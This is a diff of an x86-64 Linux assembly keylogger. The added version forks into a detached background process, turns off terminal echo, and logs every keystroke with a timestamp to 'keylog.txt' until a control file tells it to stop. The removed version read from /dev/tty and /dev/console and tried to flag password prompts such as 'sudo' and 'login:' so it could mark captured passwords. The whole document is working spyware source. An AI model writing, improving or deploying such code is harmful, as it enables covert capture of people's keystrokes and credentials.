@@ -1,195 +1,274 @@
 section .data
     fname db "keylog.txt", 0
-    tty_path db "/dev/tty", 0   
-    console_path db "/dev/console", 0  
     ctrl_file db "k.ctrl", 0     
-    fd dq 0                    
-    tty_fd dq 0                
-    console_fd dq 0            
-    ctrl_fd dq 0               
-    tbuf db 64 dup(0)          
-    nl db 0xa                  
-    s db " | ", 0              
-    dpid dq 0                  
-    detecting_password db 0    
-    password_detected db "[PASSWORD]", 0  
-
-    password_prompts db "password:", "Passwd:", "Enter PW:", "sudo", "root password:", "login:", "Authentication required", 0
-    password_prompts_len equ 7
+    fd dq 0                      ; Log file descriptor
+    ctrl_fd dq 0                 ; Control file descriptor
+    tbuf db "00000000000000000000", 0  ; 20 bytes for timestamp
+    nl db 0xa                    ; Newline character
+    s db " | ", 0                ; Separator
+    debug_msg db "Keylogger started", 0xa, 0
+    debug_len equ $ - debug_msg
 
 section .bss
-    buf resb 1                 
-    tspec resq 2               
-    termios resb 60            
-    last_chars resb 20        
+    buf resb 4                   ; Buffer for input (increased to handle multi-byte keys)
+    tspec resq 2                 ; Timespec structure
+    termios resb 60              ; struct termios
+    orig_termios resb 60         ; Original termios for restoration
 
 section .text
 global _start
 
 _start:
-    mov rax, 57            
+    ; First, create and write to control file to mark clean start
+    mov rax, 2                   ; sys_open
+    mov rdi, ctrl_file
+    mov rsi, 102o                ; O_CREAT | O_WRONLY
+    mov rdx, 0644o               ; Permissions
     syscall
     
     cmp rax, 0
-    je child              
-    mov [dpid], rax      
-    jmp parent           
-
-child:
-    mov rax, 2            
-    mov rdi, fname
-    mov rsi, 102o        
-    mov rdx, 0644o       
-    syscall
-    mov [fd], rax
-
-    mov rax, 2
-    mov rdi, tty_path
-    mov rsi, 2           
-    mov rdx, 0
-    syscall
-    mov [tty_fd], rax
-
-    mov rax, 2
-    mov rdi, console_path
-    mov rsi, 2           
-    mov rdx, 0
-    syscall
-    mov [console_fd], rax
-
-    mov rax, 16          
-    mov rdi, [tty_fd]
-    mov rsi, termios
-    syscall
-
-    mov byte [termios+3], 0   
-    mov byte [termios+6], 1   
-    mov byte [termios+7], 0   
-
-    mov rax, 16          
-    mov rdi, [tty_fd]
-    mov rsi, 2           
-    mov rdx, termios
-    syscall
-
-    mov rax, 2
-    mov rdi, ctrl_file
-    mov rsi, 102o
-    mov rdx, 0644o
-    syscall
+    jl exit                      ; Exit if can't create file
     mov [ctrl_fd], rax
-
-loop:
-    mov rax, 0
+    
+    ; Write empty byte to control file
+    mov rax, 1                   ; sys_write
     mov rdi, [ctrl_fd]
     mov rsi, buf
     mov rdx, 1
     syscall
-
-    cmp rax, 1           
-    je exit
-
-    mov rax, 228         
-    mov rdi, 0           
-    mov rsi, tspec
+    
+    ; Close control file
+    mov rax, 3                   ; sys_close
+    mov rdi, [ctrl_fd]
+    syscall
+    
+    ; Fork to create child process
+    mov rax, 57                  ; sys_fork
+    syscall
+    
+    cmp rax, 0
+    je child                     ; Child process continues
+    jg parent                    ; Parent process exits
+    
+    ; If fork failed, exit
+    mov rax, 60                  ; sys_exit
+    mov rdi, 1                   ; Error code
     syscall
 
-    mov byte [buf], 0
-
-    ; Lire depuis /dev/tty
-    mov rax, 0                
-    mov rdi, [tty_fd]                
-    mov rsi, buf
-    mov rdx, 1                
+child:
+    ; Create a new session to detach from terminal
+    mov rax, 112                 ; sys_setsid
+    syscall
+    
+    ; Open log file
+    mov rax, 2                   ; sys_open
+    mov rdi, fname
+    mov rsi, 1102o               ; O_CREAT | O_WRONLY | O_APPEND
+    mov rdx, 0644o               ; Permissions
+    syscall
+    
+    cmp rax, 0
+    jl error_exit                ; Exit if can't open log file
+    mov [fd], rax
+    
+    ; Write debug message to log
+    mov rax, 1                   ; sys_write
+    mov rdi, [fd]
+    mov rsi, debug_msg
+    mov rdx, debug_len
+    syscall
+    
+    ; Get current terminal settings from stdin
+    mov rax, 16                  ; sys_ioctl
+    mov rdi, 0                   ; STDIN_FILENO
+    mov rsi, 0x5401              ; TCGETS
+    mov rdx, termios
+    syscall
+    
+    ; Save original termios
+    mov rcx, 60                  ; Size of termios
+    mov rsi, termios
+    mov rdi, orig_termios
+copy_loop:
+    mov al, [rsi]
+    mov [rdi], al
+    inc rsi
+    inc rdi
+    dec rcx
+    jnz copy_loop
+    
+    ; Modify terminal flags:
+    ; Clear ICANON and ECHO bits in c_lflag
+    ; ICANON = 0x2, ECHO = 0x8
+    mov eax, [termios+12]        ; c_lflag is at offset 12
+    and eax, ~0x0A               ; Clear ICANON and ECHO bits
+    mov [termios+12], eax
+    
+    ; Set c_cc[VMIN] = 1, c_cc[VTIME] = 0
+    ; VMIN = 6, VTIME = 5
+    mov byte [termios+17], 1     ; c_cc[VMIN] = 1 (need at least 1 char)
+    mov byte [termios+16], 0     ; c_cc[VTIME] = 0 (no timeout)
+    
+    ; Apply modified terminal settings
+    mov rax, 16                  ; sys_ioctl
+    mov rdi, 0                   ; STDIN_FILENO
+    mov rsi, 0x5402              ; TCSETS
+    mov rdx, termios
     syscall
 
-    cmp rax, 1
-    jne check_console
-
-    jmp process_key
-
-check_console:
-    ; Lire depuis /dev/console
-    mov byte [buf], 0
-    mov rax, 0
-    mov rdi, [console_fd]
+main_loop:
+    ; Check control file
+    mov rax, 2                   ; sys_open
+    mov rdi, ctrl_file
+    mov rsi, 0                   ; O_RDONLY
+    mov rdx, 0
+    syscall
+    
+    cmp rax, 0
+    jl continue_loop             ; If can't open, just continue
+    
+    mov [ctrl_fd], rax
+    
+    ; Read from control file
+    mov rax, 0                   ; sys_read
+    mov rdi, [ctrl_fd]
     mov rsi, buf
     mov rdx, 1
     syscall
-
+    
+    ; Close control file
+    mov rax, 3                   ; sys_close
+    mov rdi, [ctrl_fd]
+    syscall
+    
+    ; If we read a byte and it's not 0, exit
     cmp rax, 1
-    jne loop
+    jne continue_loop
+    cmp byte [buf], 0
+    jne cleanup_exit
 
-process_key:
-    mov rsi, last_chars       
-    mov rcx, 19                
-    rep movsb                 
-    mov [last_chars+19], al    
-
-    call check_password_prompt
-    cmp byte [detecting_password], 1
-    jne loop
-
-    ; Ajouter un marqueur de mot de passe détecté
-    mov rax, 1                
-    mov rdi, [fd]
-    mov rsi, password_detected
-    mov rdx, 11              
+continue_loop:
+    ; Get current time
+    mov rax, 228                 ; sys_clock_gettime
+    mov rdi, 0                   ; CLOCK_REALTIME
+    mov rsi, tspec
     syscall
 
-    mov rax, 1                
+    ; Read keyboard input (non-blocking)
+    mov rax, 0                   ; sys_read
+    mov rdi, 0                   ; STDIN_FILENO
+    mov rsi, buf
+    mov rdx, 4                   ; Read up to 4 bytes (for multi-byte chars)
+    syscall
+
+    ; If no data or error, continue
+    cmp rax, 0
+    jle main_loop
+
+    ; Convert timestamp to string
+    mov rax, [tspec]             ; Seconds part
+    mov rdi, tbuf
+    call format_time
+
+    ; Write timestamp to log
+    mov rax, 1                   ; sys_write
     mov rdi, [fd]
     mov rsi, tbuf
-    mov rdx, 20              
+    mov rdx, 20                  ; Length of timestamp
     syscall
 
-    mov rax, 1
+    ; Write separator
+    mov rax, 1                   ; sys_write
     mov rdi, [fd]
     mov rsi, s
     mov rdx, 3
     syscall
 
-    mov rax, 1                
+    ; Write keystroke (rax contains bytes read)
+    mov rdx, rax                 ; Number of bytes to write
+    mov rax, 1                   ; sys_write
     mov rdi, [fd]
     mov rsi, buf
-    mov rdx, 1
     syscall
 
-    mov rax, 1
+    ; Write newline
+    mov rax, 1                   ; sys_write
     mov rdi, [fd]
     mov rsi, nl
     mov rdx, 1
     syscall
 
-    jmp loop
+    ; Small sleep to avoid CPU hogging
+    mov qword [tspec], 0         ; tv_sec = 0
+    mov qword [tspec+8], 10000000 ; tv_nsec = 10ms
+    mov rax, 35                  ; sys_nanosleep
+    mov rdi, tspec
+    mov rsi, 0                   ; Don't care about remaining time
+    syscall
 
-check_password_prompt:
-    mov rdi, last_chars
-    mov rsi, password_prompts
-    mov rcx, password_prompts_len
+    jmp main_loop
 
-.password_check_loop:
-    cmp rcx, 0
-    je .no_password
-    
+cleanup_exit:
+    ; Restore original terminal settings
+    mov rax, 16                  ; sys_ioctl
+    mov rdi, 0                   ; STDIN_FILENO
+    mov rsi, 0x5402              ; TCSETS
+    mov rdx, orig_termios
+    syscall
+
+    ; Close log file
+    mov rax, 3                   ; sys_close
+    mov rdi, [fd]
+    syscall
+
+error_exit:
+    ; Exit with error code
+    mov rax, 60                  ; sys_exit
+    mov rdi, 1
+    syscall
+
+parent:
+    ; Parent just exits immediately
+    mov rax, 60                  ; sys_exit
+    xor rdi, rdi
+    syscall
+
+exit:
+    ; Normal exit
+    mov rax, 60                  ; sys_exit
+    xor rdi, rdi
+    syscall
+
+; Format time function
+format_time:
+    push rbx
     push rcx
-    push rdi
-    push rsi
     
-    mov rcx, 10
-    repe cmpsb
-    je .found_password
+    mov rbx, 10                  ; Base 10
+    add rdi, 19                  ; Point to end of buffer
+    mov byte [rdi], 0            ; Null terminator
     
-    pop rsi
-    pop rdi
+    mov rcx, 19                  ; Counter for digits
+.loop:
+    dec rdi
+    xor rdx, rdx
+    div rbx
+    add dl, '0'                  ; Convert to ASCII
+    mov [rdi], dl                ; Store digit
+    dec rcx
+    test rax, rax
+    jnz .loop                    ; Continue until number is converted
+    
+    ; Fill remaining positions with zeros
+    test rcx, rcx
+    jz .done
+.fill_zeros:
+    dec rdi
+    mov byte [rdi], '0'
+    dec rcx
+    jnz .fill_zeros
+    
+.done:
     pop rcx
-    add rsi, 10
-    loop .password_check_loop
-
-.no_password:
-    mov byte [detecting_password], 0
-    ret
-
-.found_password:
-    mov byte [detecting_password], 1
+    pop rbx
     ret
